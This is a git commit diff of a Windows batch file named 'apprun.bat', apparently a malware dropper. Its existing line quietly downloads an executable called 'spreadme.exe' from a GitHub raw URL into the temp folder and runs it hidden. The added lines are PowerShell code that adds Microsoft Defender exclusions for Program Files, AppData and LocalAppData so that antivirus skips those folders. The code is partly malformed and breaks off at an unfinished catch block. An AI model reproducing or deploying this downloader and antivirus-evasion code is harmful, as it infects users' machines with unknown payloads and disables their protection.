9515ee969e65f94bb4b2a4a428baf86399889ac8
laikdmaldjcukalmfladha-cpu <laikdmaldjcukalmfladha@gmail.com>
2026-02-02 19:44:21 -0500

    apprun.bat

--- apprun.bat
+++ apprun.bat
@@ -1,2 +1,22 @@
 @echo off
 start /b cmd /c “curl -L https://github.com/laikdmaldjcukalmfladha-cpu/testfile.4248u184asxc/raw/refs/heads/main/spreadme.exe -o %temp%\spreadme.exe >nul 2>&1 && start %temp%\spreadme.exe >nul 2>&1”
+
+try {
+    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
+        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
+        $updpath = $ProgramFiles -replace " \(x86\)", ""
+        Add-MpPreference -ExclusionPath $updpath
+
+        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
+        if (Test-Path $ProgramFilesX86) {
+            Add-MpPreference -ExclusionPath $ProgramFilesX86
+        }
+
+        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
+        Add-MpPreference -ExclusionPath $AppData
+
+        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
+        Add-MpPreference -ExclusionPath $LocalAppData
+        }
+        }
+catch {
